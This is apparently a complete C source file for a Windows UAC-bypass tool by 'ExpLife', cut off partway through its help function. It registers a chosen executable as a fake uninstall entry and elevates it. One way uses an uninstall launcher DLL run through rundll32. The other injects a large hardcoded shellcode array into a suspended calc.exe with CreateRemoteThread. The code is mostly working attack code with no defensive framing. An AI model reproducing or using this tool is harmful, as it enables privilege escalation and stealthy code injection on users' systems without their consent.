#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <math.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

#define InjectTarget _T("\\calc.exe")
	
#define SizeOfBypassUac 2001
	
VOID SafeGetNativeSystemInfo(__out LPSYSTEM_INFO lpSystemInfo);
int GetSystemBits();
VOID AddUninstallItem(LPCTSTR lpFullPathName);
BOOL AddRegKeyValue(LPCTSTR lpSubKey,LPCTSTR lpValueName, LPCTSTR lpData);
BOOL DeleteRegKeyValue(LPCTSTR lpSubKey,LPCTSTR lpValueName);
VOID DeleteUninstallItem();
BOOL BypassUacWithInject(LPTSTR lpExe);
BOOL ExtractFileWithRes(UINT nResID, LPCTSTR pszResType, LPCTSTR pszSavePath);
VOID BypassUacWithoutInject(LPTSTR lpExe);
VOID Help();
VOID BypassUac(LPTSTR lpData, DWORD dwIndex);
			
BYTE g_ByPassUac[SizeOfBypassUac] = {
	0xE9, 0x18, 0x01, 0x00, 0x00, 0x56, 0x51, 0x57, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x1C, 0x33, 0xC9, 0x8B, 0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x66, 0x39,
	0x4F, 0x12, 0x75, 0xF2, 0x5F, 0x59, 0x5E, 0xC3, 0x56, 0x51, 0x57, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x1C, 0x33, 0xC9, 0x8B, 0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B,
	0x36, 0x66, 0x39, 0x4F, 0x18, 0x75, 0xF2, 0x5F, 0x59, 0x5E, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x83, 0x65, 0xF4, 0x00, 0x53, 0x8B, 0x5D, 0x08, 0xB8, 0x4D, 0x5A, 0x00, 0x00, 0x66, 0x39,
	0x03, 0x74, 0x04, 0x33, 0xC0, 0xEB, 0x7F, 0x8B, 0x43, 0x3C, 0x03, 0xC3, 0x81, 0x38, 0x50, 0x45, 0x00, 0x00, 0x75, 0xEF, 0x83, 0x78, 0x7C, 0x00, 0x74, 0xE9, 0x8B, 0x48, 0x78, 0x85, 0xC9, 0x74,
	0xE2, 0x03, 0xCB, 0x8B, 0x41, 0x18, 0x85, 0xC0, 0x74, 0xD9, 0x8B, 0x51, 0x20, 0x56, 0x57, 0x8B, 0x79, 0x24, 0x8B, 0x49, 0x1C, 0x33, 0xF6, 0x03, 0xD3, 0x03, 0xFB, 0x03, 0xCB, 0x48, 0x89, 0x75,
	0xF8, 0x89, 0x45, 0xF0, 0x74, 0x3B, 0x8B, 0x34, 0xB2, 0x83, 0x65, 0xFC, 0x00, 0x03, 0xF3, 0x8A, 0x06, 0x84, 0xC0, 0x74, 0x18, 0x8B, 0x5D, 0xFC, 0x0F, 0xBE, 0xC0, 0xC1, 0xCB, 0x07, 0x03, 0xD8,
	0x46, 0x8A, 0x06, 0x89, 0x5D, 0xFC, 0x84, 0xC0, 0x75, 0xEB, 0x8B, 0x5D, 0x08, 0x8B, 0x45, 0xFC, 0x8B, 0x75, 0xF8, 0x3B, 0x45, 0x0C, 0x74, 0x11, 0x46, 0x89, 0x75, 0xF8, 0x3B, 0x75, 0xF0, 0x72,
	0xC5, 0x8B, 0x45, 0xF4, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x83, 0x7D, 0x10, 0x00, 0x74, 0x0C, 0x8B, 0x04, 0xB2, 0x03, 0xC3, 0x50, 0x53, 0xFF, 0x55, 0x10, 0xEB, 0xE9, 0x0F, 0xB7, 0x04, 0x77, 0x8B,
	0x04, 0x81, 0x03, 0xC3, 0xEB, 0xDE, 0x55, 0x8B, 0xEC, 0x51, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x58, 0x2D, 0x0F, 0x11, 0x19, 0x01, 0x89, 0x45, 0xFC, 0x8B, 0x45, 0xFC, 0xC9, 0xC3, 0x55, 0x8D, 0x6C,
	0x24, 0x88, 0x81, 0xEC, 0x64, 0x01, 0x00, 0x00, 0x53, 0x56, 0x57, 0x6A, 0x7B, 0x58, 0x6A, 0x46, 0x66, 0x89, 0x45, 0xD0, 0x58, 0x6A, 0x38, 0x59, 0x6A, 0x35, 0x66, 0x89, 0x45, 0xD2, 0x8B, 0xC1,
	0x66, 0x89, 0x45, 0xD4, 0x66, 0x89, 0x45, 0xD6, 0x58, 0x6A, 0x31, 0x66, 0x89, 0x45, 0xD8, 0x58, 0x6A, 0x32, 0x66, 0x89, 0x45, 0xDA, 0x58, 0x6A, 0x30, 0x5A, 0x6A, 0x45, 0x66, 0x89, 0x45, 0xDC,
	0x8B, 0xC2, 0x66, 0x89, 0x45, 0xDE, 0x58, 0x6A, 0x2D, 0x66, 0x89, 0x45, 0xE0, 0x58, 0x6A, 0x33, 0x8B, 0xF0, 0x66, 0x89, 0x75, 0xE2, 0x5E, 0x6A, 0x37, 0x66, 0x89, 0x75, 0xE4, 0x5E, 0x6A, 0x39,
	0x5F, 0x66, 0x89, 0x75, 0xE6, 0x6A, 0x34, 0x8B, 0xF1, 0x66, 0x89, 0x75, 0xE8, 0x8B, 0xF7, 0x66, 0x89, 0x75, 0xEA, 0x8B, 0xF0, 0x66, 0x89, 0x75, 0xEC, 0x5E, 0x6A, 0x46, 0x66, 0x89, 0x75, 0xEE,
	0x5E, 0x6A, 0x44, 0x66, 0x89, 0x75, 0xF0, 0x5E, 0x66, 0x89, 0x75, 0xF2, 0x8B, 0xF7, 0x66, 0x89, 0x75, 0xF4, 0x6A, 0x36, 0x8B, 0xF0, 0x66, 0x89, 0x75, 0xF6, 0x8B, 0xF1, 0x66, 0x89, 0x75, 0xF8,
	0x5E, 0x6A, 0x35, 0x66, 0x89, 0x75, 0xFA, 0x5E, 0x6A, 0x45, 0x66, 0x89, 0x75, 0xFC, 0x5E, 0x66, 0x89, 0x75, 0xFE, 0x8B, 0xF0, 0x6A, 0x44, 0x66, 0x89, 0x75, 0x00, 0x5E, 0x66, 0x89, 0x75, 0x02,
	0x6A, 0x43, 0x5E, 0x66, 0x89, 0x75, 0x04, 0x8B, 0xF7, 0x6A, 0x42, 0x66, 0x89, 0x75, 0x06, 0x5E, 0x6A, 0x34, 0x66, 0x89, 0x75, 0x08, 0x5E, 0x6A, 0x41, 0x66, 0x89, 0x75, 0x0A, 0x5E, 0x6A, 0x36,
	0x8B, 0xDE, 0x66, 0x89, 0x5D, 0x0C, 0x5B, 0x6A, 0x34, 0x66, 0x89, 0x5D, 0x0E, 0x5B, 0x6A, 0x31, 0x66, 0x89, 0x5D, 0x10, 0x5B, 0x6A, 0x32, 0x66, 0x89, 0x5D, 0x12, 0x5B, 0x6A, 0x44, 0x66, 0x89,
	0x5D, 0x14, 0x5B, 0x6A, 0x32, 0x66, 0x89, 0x5D, 0x16, 0x5B, 0x6A, 0x7D, 0x66, 0x89, 0x5D, 0x18, 0x5B, 0x6A, 0x45, 0x66, 0x89, 0x5D, 0x1A, 0x33, 0xDB, 0x66, 0x89, 0x5D, 0x1C, 0x5B, 0x6A, 0x6C,
	0x66, 0x89, 0x9D, 0x48, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x65, 0x66, 0x89, 0x9D, 0x4A, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x76, 0x66, 0x89, 0x9D, 0x4C, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x61, 0x66, 0x89,
	0x9D, 0x4E, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x74, 0x66, 0x89, 0x9D, 0x50, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x69, 0x66, 0x89, 0x9D, 0x52, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x6F, 0x66, 0x89, 0x9D, 0x54,
	0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x6E, 0x66, 0x89, 0x9D, 0x56, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x3A, 0x66, 0x89, 0x9D, 0x58, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x64, 0x66, 0x89, 0x9D, 0x5A, 0xFF, 0xFF,
	0xFF, 0x8B, 0xDE, 0x66, 0x89, 0x9D, 0x5C, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x6D, 0x66, 0x89, 0x9D, 0x5E, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x69, 0x66, 0x89, 0x9D, 0x60, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A,
	0x6E, 0x66, 0x89, 0x9D, 0x62, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x69, 0x66, 0x89, 0x9D, 0x64, 0xFF, 0xFF, 0xFF, 0x5B, 0x66, 0x89, 0x9D, 0x66, 0xFF, 0xFF, 0xFF, 0x6A, 0x73, 0x5B, 0x6A, 0x74, 0x66,
	0x89, 0x9D, 0x68, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x72, 0x66, 0x89, 0x9D, 0x6A, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x61, 0x66, 0x89, 0x9D, 0x6C, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x74, 0x66, 0x89, 0x9D,
	0x6E, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x6F, 0x66, 0x89, 0x9D, 0x70, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x72, 0x66, 0x89, 0x9D, 0x72, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x21, 0x66, 0x89, 0x9D, 0x74, 0xFF,
	0xFF, 0xFF, 0x5B, 0x6A, 0x6E, 0x66, 0x89, 0x9D, 0x76, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x65, 0x66, 0x89, 0x9D, 0x78, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x77, 0x66, 0x89, 0x9D, 0x7A, 0xFF, 0xFF, 0xFF,
	0x5B, 0x6A, 0x3A, 0x66, 0x89, 0x9D, 0x7C, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x7B, 0x66, 0x89, 0x9D, 0x7E, 0xFF, 0xFF, 0xFF, 0x5B, 0x6A, 0x46, 0x66, 0x89, 0x5D, 0x80, 0x5B, 0x6A, 0x43, 0x66, 0x89,
	0x5D, 0x82, 0x5B, 0x6A, 0x37, 0x66, 0x89, 0x5D, 0x84, 0x66, 0x89, 0x5D, 0x86, 0x5B, 0x6A, 0x34, 0x66, 0x89, 0x5D, 0x88, 0x5B, 0x6A, 0x42, 0x66, 0x89, 0x5D, 0x8A, 0x5B, 0x6A, 0x37, 0x66, 0x89,
	0x5D, 0x8C, 0x5B, 0x6A, 0x45, 0x66, 0x89, 0x5D, 0x8E, 0x66, 0x89, 0x5D, 0x90, 0x8B, 0xD8, 0x66, 0x89, 0x5D, 0x92, 0x5B, 0x6A, 0x43, 0x66, 0x89, 0x5D, 0x94, 0x5B, 0x6A, 0x33, 0x66, 0x89, 0x5D,
	0x96, 0x5B, 0x6A, 0x45, 0x66, 0x89, 0x5D, 0x98, 0x5B, 0x66, 0x89, 0x5D, 0x9A, 0x8B, 0xD8, 0x6A, 0x34, 0x66, 0x89, 0x5D, 0x9C, 0x5B, 0x6A, 0x44, 0x66, 0x89, 0x5D, 0x9E, 0x5B, 0x66, 0x89, 0x5D,
	0xA0, 0x66, 0x89, 0x5D, 0xA2, 0x6A, 0x42, 0x8B, 0xD9, 0x66, 0x89, 0x5D, 0xA4, 0x8B, 0xD8, 0x66, 0x89, 0x5D, 0xA6, 0x8B, 0xDE, 0x66, 0x89, 0x5D, 0xA8, 0x8B, 0xD9, 0x66, 0x89, 0x5D, 0xAA, 0x8B,
	0xDA, 0x66, 0x89, 0x5D, 0xAC, 0x5B, 0x66, 0x89, 0x5D, 0xAE, 0x6A, 0x37, 0x8B, 0xD8, 0x66, 0x89, 0x5D, 0xB0, 0x8B, 0xDA, 0x66, 0x89, 0x5D, 0xB2, 0x66, 0x89, 0x5D, 0xB4, 0x8B, 0xD9, 0x66, 0x89,
	0x5D, 0xB6, 0x8B, 0xDE, 0x66, 0x89, 0x5D, 0xB8, 0x5B, 0x66, 0x89, 0x5D, 0xBA, 0x6A, 0x32, 0x8B, 0xDA, 0x66, 0x89, 0x5D, 0xBC, 0x5B, 0x66, 0x89, 0x5D, 0xBE, 0x6A, 0x37, 0x8B, 0xDA, 0x66, 0x89,
	0x5D, 0xC0, 0x5B, 0x66, 0x89, 0x5D, 0xC2, 0x6A, 0x35, 0x5B, 0x66, 0x89, 0x5D, 0xC4, 0x6A, 0x7D, 0x8B, 0xDE, 0x66, 0x89, 0x5D, 0xC6, 0x8B, 0xDF, 0x66, 0x89, 0x5D, 0xC8, 0x5B, 0x66, 0x89, 0x5D,
	0xCA, 0x33, 0xDB, 0x6A, 0x7B, 0x66, 0x89, 0x5D, 0xCC, 0x5B, 0x66, 0x89, 0x5D, 0x20, 0x6A, 0x31, 0x8B, 0xDE, 0x66, 0x89, 0x5D, 0x22, 0x5B, 0x66, 0x89, 0x5D, 0x24, 0x6A, 0x36, 0x5B, 0x66, 0x89,
	0x5D, 0x26, 0x6A, 0x33, 0x5B, 0x66, 0x89, 0x5D, 0x28, 0x8B, 0xDF, 0x66, 0x89, 0x5D, 0x2A, 0x6A, 0x46, 0x8B, 0xDA, 0x66, 0x89, 0x5D, 0x2C, 0x5B, 0x66, 0x89, 0x5D, 0x2E, 0x6A, 0x43, 0x5B, 0x66,
	0x89, 0x5D, 0x30, 0x8B, 0xD8, 0x66, 0x89, 0x5D, 0x32, 0x8B, 0xDF, 0x66, 0x89, 0x5D, 0x34, 0x6A, 0x44, 0x5B, 0x66, 0x89, 0x5D, 0x36, 0x8B, 0xD9, 0x66, 0x89, 0x5D, 0x38, 0x6A, 0x31, 0x5B, 0x6A,
	0x34, 0x66, 0x89, 0x5D, 0x3A, 0x8B, 0xD8, 0x66, 0x89, 0x5D, 0x3C, 0x5B, 0x6A, 0x33, 0x66, 0x89, 0x5D, 0x3E, 0x5B, 0x6A, 0x42, 0x66, 0x89, 0x5D, 0x40, 0x5B, 0x6A, 0x31, 0x66, 0x89, 0x5D, 0x42,
	0x5B, 0x6A, 0x33, 0x66, 0x89, 0x45, 0x50, 0x66, 0x89, 0x75, 0x4A, 0x5E, 0x6A, 0x43, 0x66, 0x89, 0x5D, 0x44, 0x8B, 0xD8, 0x66, 0x89, 0x75, 0x4C, 0x5E, 0x6A, 0x32, 0x8B, 0xC1, 0x66, 0x89, 0x45,
	0x52, 0x58, 0x66, 0x89, 0x45, 0x54, 0x6A, 0x32, 0x8B, 0xC1, 0x66, 0x89, 0x45, 0x56, 0x8B, 0xC2, 0x66, 0x89, 0x45, 0x58, 0x58, 0x6A, 0x46, 0x66, 0x89, 0x45, 0x5A, 0x58, 0x6A, 0x36, 0x66, 0x89,
	0x45, 0x5C, 0x58, 0x6A, 0x31, 0x66, 0x89, 0x45, 0x5E, 0x58, 0x66, 0x89, 0x45, 0x64, 0x6A, 0x33, 0x58, 0x66, 0x89, 0x5D, 0x46, 0x66, 0x89, 0x45, 0x68, 0x8B, 0xD9, 0x6A, 0x7D, 0x58, 0x66, 0x89,
	0x5D, 0x48, 0x66, 0x89, 0x45, 0x6A, 0x33, 0xC0, 0x33, 0xDB, 0x66, 0x89, 0x75, 0x4E, 0x66, 0x89, 0x55, 0x60, 0x66, 0x89, 0x4D, 0x62, 0x66, 0x89, 0x7D, 0x66, 0x66, 0x89, 0x45, 0x6C, 0x89, 0x5D,
	0x74, 0x89, 0x5D, 0x70, 0xE8, 0xBD, 0xFB, 0xFF, 0xFF, 0x8B, 0xF0, 0x81, 0xC6, 0xA9, 0x17, 0x19, 0x01, 0xE8, 0x7F, 0x00, 0x00, 0x00, 0x53, 0xFF, 0x56, 0x10, 0x8D, 0x85, 0x38, 0xFF, 0xFF, 0xFF,
	0x50, 0x8D, 0x45, 0xD0, 0x50, 0xFF, 0x56, 0x14, 0x6A, 0x24, 0x5F, 0x57, 0x8D, 0x85, 0x14, 0xFF, 0xFF, 0xFF, 0x50, 0xFF, 0x56, 0x18, 0x8D, 0x45, 0x74, 0x50, 0x8D, 0x85, 0x38, 0xFF, 0xFF, 0xFF,
	0x50, 0x8D, 0x85, 0x14, 0xFF, 0xFF, 0xFF, 0x50, 0x8D, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x50, 0x89, 0xBD, 0x14, 0xFF, 0xFF, 0xFF, 0xC7, 0x85, 0x28, 0xFF, 0xFF, 0xFF, 0x04, 0x00, 0x00, 0x00, 0xFF,
	0x56, 0x1C, 0x85, 0xC0, 0x7C, 0x1F, 0x8B, 0x4D, 0x74, 0x8B, 0x01, 0x8B, 0x78, 0x08, 0x53, 0x53, 0x8D, 0x55, 0x20, 0x52, 0x53, 0x51, 0xFF, 0x50, 0x0C, 0xFF, 0x75, 0x74, 0xFF, 0xD7, 0xC7, 0x45,
	0x70, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x75, 0x70, 0xFF, 0x56, 0x24, 0x5F, 0x8B, 0xC6, 0x5E, 0x5B, 0x83, 0xC5, 0x78, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x0C, 0x53, 0x56, 0x57, 0xC6, 0x45,
	0xF4, 0x6F, 0xC6, 0x45, 0xF5, 0x6C, 0xC6, 0x45, 0xF6, 0x65, 0xC6, 0x45, 0xF7, 0x33, 0xC6, 0x45, 0xF8, 0x32, 0xC6, 0x45, 0xF9, 0x2E, 0xC6, 0x45, 0xFA, 0x64, 0xC6, 0x45, 0xFB, 0x6C, 0xC6, 0x45,
	0xFC, 0x6C, 0xC6, 0x45, 0xFD, 0x00, 0xE8, 0xFB, 0xFA, 0xFF, 0xFF, 0x8B, 0xF0, 0x81, 0xC6, 0xA9, 0x17, 0x19, 0x01, 0xE8, 0x10, 0xFA, 0xFF, 0xFF, 0x8B, 0xF8, 0x89, 0x3E, 0xE8, 0xE4, 0xF9, 0xFF,
	0xFF, 0x8B, 0xD8, 0xE8, 0xDD, 0xF9, 0xFF, 0xFF, 0x6A, 0x00, 0xFF, 0x76, 0x08, 0x89, 0x46, 0x04, 0x57, 0xE8, 0x15, 0xFA, 0xFF, 0xFF, 0x50, 0xFF, 0x76, 0x0C, 0x89, 0x46, 0x08, 0x57, 0xE8, 0x08,
	0xFA, 0xFF, 0xFF, 0xFF, 0x76, 0x08, 0x89, 0x46, 0x0C, 0xFF, 0x76, 0x24, 0x57, 0xE8, 0xF9, 0xF9, 0xFF, 0xFF, 0x89, 0x46, 0x24, 0x83, 0xC4, 0x24, 0x8D, 0x45, 0xF4, 0x50, 0xFF, 0x56, 0x0C, 0xFF,
	0x76, 0x08, 0x8B, 0xF8, 0xFF, 0x76, 0x1C, 0x57, 0xE8, 0xDE, 0xF9, 0xFF, 0xFF, 0xFF, 0x76, 0x08, 0x89, 0x46, 0x1C, 0xFF, 0x76, 0x20, 0x57, 0xE8, 0xCF, 0xF9, 0xFF, 0xFF, 0xFF, 0x76, 0x08, 0x89,
	0x46, 0x20, 0xFF, 0x76, 0x18, 0x53, 0xE8, 0xC0, 0xF9, 0xFF, 0xFF, 0xFF, 0x76, 0x08, 0x89, 0x46, 0x18, 0xFF, 0x76, 0x10, 0x57, 0xE8, 0xB1, 0xF9, 0xFF, 0xFF, 0xFF, 0x76, 0x08, 0x89, 0x46, 0x10,
	0xFF, 0x76, 0x14, 0x57, 0xE8, 0xA2, 0xF9, 0xFF, 0xFF, 0x83, 0xC4, 0x3C, 0x5F, 0x89, 0x46, 0x14, 0x5E, 0x5B, 0xC9, 0xC3, 0x51, 0x51, 0x53, 0x55, 0x56, 0x57, 0x6A, 0x0A, 0x59, 0x33, 0xC0, 0xBD,
	0xA0, 0x33, 0x19, 0x01, 0x8B, 0xFD, 0xF3, 0xAB, 0xBF, 0xA9, 0x17, 0x19, 0x01, 0xBE, 0x00, 0x10, 0x19, 0x01, 0x2B, 0xFE, 0x8D, 0x47, 0x28, 0x50, 0x6A, 0x00, 0xC7, 0x05, 0xBC, 0x33, 0x19, 0x01,
	0x7D, 0x1E, 0xCA, 0xD0, 0xC7, 0x05, 0xC0, 0x33, 0x19, 0x01, 0xB6, 0x4D, 0x8B, 0xED, 0xC7, 0x05, 0xA8, 0x33, 0x19, 0x01, 0x85, 0xDF, 0xAF, 0xBB, 0xC7, 0x05, 0xAC, 0x33, 0x19, 0x01, 0x32, 0x74,
	0x91, 0x0C, 0xC7, 0x05, 0xB8, 0x33, 0x19, 0x01, 0x89, 0xF4, 0x5D, 0x55, 0xC7, 0x05, 0xB0, 0x33, 0x19, 0x01, 0x16, 0x55, 0xF4, 0xF0, 0xC7, 0x05, 0xB4, 0x33, 0x19, 0x01, 0x3F, 0x1A, 0x6C, 0x6B,
	0xC7, 0x05, 0xC4, 0x33, 0x19, 0x01, 0x63, 0x89, 0xD1, 0x4F, 0x89, 0x44, 0x24, 0x18, 0xFF, 0x15, 0x08, 0x20, 0x19, 0x01, 0x8B, 0xD8, 0x85, 0xDB, 0x74, 0x68, 0x57, 0x56, 0x53, 0xE8, 0x72, 0x08,
	0x00, 0x00, 0x83, 0xC4, 0x0C, 0x6A, 0x0A, 0x59, 0x03, 0xFB, 0x8B, 0xF5, 0xF3, 0xA5, 0x33, 0xFF, 0x57, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x01, 0x57, 0x6A, 0x01, 0x68, 0x00, 0x00, 0x00, 0x40,
	0x68, 0x04, 0x21, 0x19, 0x01, 0xFF, 0x15, 0x00, 0x20, 0x19, 0x01, 0x8B, 0xF0, 0x83, 0xFE, 0xFF, 0x74, 0x29, 0x57, 0x8D, 0x44, 0x24, 0x18, 0x50, 0xFF, 0x74, 0x24, 0x18, 0x53, 0x56, 0xFF, 0x15,
	0x04, 0x20, 0x19, 0x01, 0x85, 0xC0, 0x74, 0x0C, 0x68, 0x18, 0x21, 0x19, 0x01, 0xFF, 0x15, 0xB4, 0x20, 0x19, 0x01, 0x59, 0x56, 0xFF, 0x15, 0x10, 0x20, 0x19, 0x01, 0x53, 0xFF, 0x15, 0x0C, 0x20,
	0x19, 0x01, 0x5F, 0x5E, 0x5D, 0x5B, 0x59, 0x59, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x85, 0xDF, 0xAF, 0xBB, 0x32, 0x74, 0x91, 0x0C, 0x16, 0x55, 0xF4, 0xF0, 0x3F, 0x1A, 0x6C,
	0x6B, 0x89, 0xF4, 0x5D, 0x55, 0x7D, 0x1E, 0xCA, 0xD0, 0xB6, 0x4D, 0x8B, 0xED, 0x63, 0x89, 0xD1, 0x4F};
	
VOID SafeGetNativeSystemInfo(__out LPSYSTEM_INFO lpSystemInfo)
{
	if (NULL==lpSystemInfo)    
		return;
	typedef VOID (WINAPI *TGetNativeSystemInfo)(LPSYSTEM_INFO);
	TGetNativeSystemInfo xGetNativeSystemInfo = (TGetNativeSystemInfo)GetProcAddress( GetModuleHandle(_T("kernel32")), "GetNativeSystemInfo");;
	if (NULL != xGetNativeSystemInfo)
	{
		xGetNativeSystemInfo(lpSystemInfo);
	}
	else
	{
		GetSystemInfo(lpSystemInfo);
	}
}

int GetSystemBits()
{
	SYSTEM_INFO si;
	SafeGetNativeSystemInfo(&si);
	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
		si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 )
	{
		return 64;
	}	
	return 32;
}

VOID AddUninstallItem(LPCTSTR lpFullPathName)
{
	AddRegKeyValue(_T("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{A16390FC-9D81-43B1-8A3C-82802F608193}"), _T("UninstallString"), 
		lpFullPathName);
}

BOOL AddRegKeyValue(LPCTSTR lpSubKey,LPCTSTR lpValueName, LPCTSTR lpData)
{
	HKEY hKey;
	BOOL bResult = FALSE;
	DWORD dwDisposition = 0;
	REGSAM samDesired = KEY_ALL_ACCESS;

	if (GetSystemBits() == 64)
	{
		samDesired |= KEY_WOW64_64KEY;
	}

	if (RegCreateKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, NULL, 0, samDesired, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS)
	{
		goto EXIT;
	}

	if (RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (const PBYTE)lpData, (_tcslen(lpData) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	bResult = TRUE;

EXIT:
	RegCloseKey(hKey);

	return bResult;
}

BOOL DeleteRegKeyValue(LPCTSTR lpSubKey,LPCTSTR lpValueName)
{	
	HKEY hKey;
	BOOL bResult = FALSE;
	DWORD dwDisposition = REG_OPENED_EXISTING_KEY;
	REGSAM samDesired = KEY_ALL_ACCESS;

	if (GetSystemBits() == 64)
	{
		samDesired |= KEY_WOW64_64KEY;
	}

	if (RegCreateKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, NULL, 0, samDesired, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS)
	{
		goto EXIT;
	}

	if (RegDeleteValue(hKey, lpValueName) != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	if (RegDeleteKeyEx(HKEY_CURRENT_USER, lpSubKey,samDesired, 0) != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	bResult = TRUE;

EXIT:
	RegCloseKey(hKey);

	return bResult;
}

VOID DeleteUninstallItem()
{
	DeleteRegKeyValue(_T("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{A16390FC-9D81-43B1-8A3C-82802F608193}"), _T("UninstallString"));
}
	
BOOL BypassUacWithInject(LPTSTR lpExe)
{
	HMODULE hModule = GetModuleHandle(NULL);
	TCHAR cAppName[MAX_PATH] = {0};
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID lpMalwareBaseAddr;
	LPVOID lpNewVictimBaseAddr;
	HANDLE hThread;
	DWORD dwExitCode;
	BOOL bRet = FALSE;

	lpMalwareBaseAddr = g_ByPassUac;

	AddUninstallItem(lpExe);

	GetSystemDirectory(cAppName, MAX_PATH);
	_tcscat(cAppName, InjectTarget);

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	if (CreateProcess(cAppName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,	NULL, NULL,	&si, &pi) == 0)
	{
		return bRet;
	}

	lpNewVictimBaseAddr = VirtualAllocEx(pi.hProcess,
		NULL,
		SizeOfBypassUac,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (lpNewVictimBaseAddr == NULL)
	{
		return bRet;
	}

	WriteProcessMemory(pi.hProcess, lpNewVictimBaseAddr, (LPCVOID)lpMalwareBaseAddr, SizeOfBypassUac, NULL);

	hThread = CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpNewVictimBaseAddr, NULL, 0, NULL);

	WaitForSingleObject(pi.hThread, INFINITE);
	GetExitCodeProcess(pi.hProcess, &dwExitCode);
	TerminateProcess(pi.hProcess, 0);

	DeleteUninstallItem();

	return bRet;
}

BOOL ExtractFileWithRes(UINT nResID, LPCTSTR pszResType, LPCTSTR pszSavePath)
{	
	if (NULL == pszResType || NULL == pszSavePath)
	{
		return false;
	}
	
	HRSRC hResource = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(nResID), pszResType);
	if (hResource != NULL)
	{
		HGLOBAL hg = LoadResource(GetModuleHandle(NULL), hResource);
		if (hg != NULL)
		{
			LPVOID pData = LockResource(hg);
			if (pData != NULL)
			{	
				DWORD dwSize = SizeofResource(GetModuleHandle(NULL), hResource);
				FILE *fp = _tfopen(pszSavePath, _T("wb"));
				if (fp != NULL)
				{	
					DWORD dwCount = 0, dwWrite = 0;
					while (dwCount < dwSize)
					{
						dwWrite = dwSize - dwCount > 2048 ? 2048 : dwSize - dwCount;
						fwrite((char *)pData + dwCount, 1, dwWrite, fp);
						dwCount += dwWrite;
					}
					fclose(fp);
					return TRUE;
				}
			}
		}
	}

	return false;
}

VOID BypassUacWithoutInject(LPTSTR lpExe)
{
	    CHAR szPath[MAX_PATH] = {0};
		CHAR szCmd[MAX_PATH] = {0};
		CHAR* pStr = NULL;
		AddUninstallItem(lpExe);

		//GetTempPath(MAX_PATH, szPath);
		GetModuleFileNameA(NULL, szPath, MAX_PATH);
		pStr = strrchr(szPath, '\\');
		*pStr = 0;
		strcat(szPath, "\\InvokeARPUninstallStringLauncherInDll.dll");
		
		//if (PathFileExists(szPath))
		//{	
		//	DeleteFile(szPath);
		//}
		
		//ExtractFileWithRes(IDR_RUNDLL32_DLL1, _T("RUNDLL32_DLL"), szPath);
		
		sprintf(szCmd, "rundll32.exe \"%s\",#1", szPath);
		system(szCmd);
		
		//DeleteFile(szPath);

		DeleteUninstallItem();
}
			
VOID BypassUac(LPTSTR lpData, DWORD dwIndex)
{
	switch(dwIndex)
	{
	case 0:
		BypassUacWithoutInject(lpData);
		break;
	case 1:
		BypassUacWithInject(lpData);
		break;
	default:
		BypassUacWithoutInject(lpData);
		break;
	}
}
		
VOID Help()
{
	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(handle, 2);
	printf("By ExpLife\r\n");
	SetConsoleTextAttribute(handle, 3);
	printf("Usage: XXX.exe TheFullPathOfTarget Number\r\n");
	SetConsoleTextAttribute(handle, 4);
	printf("The number parameter can be 0 or 1\r\n");
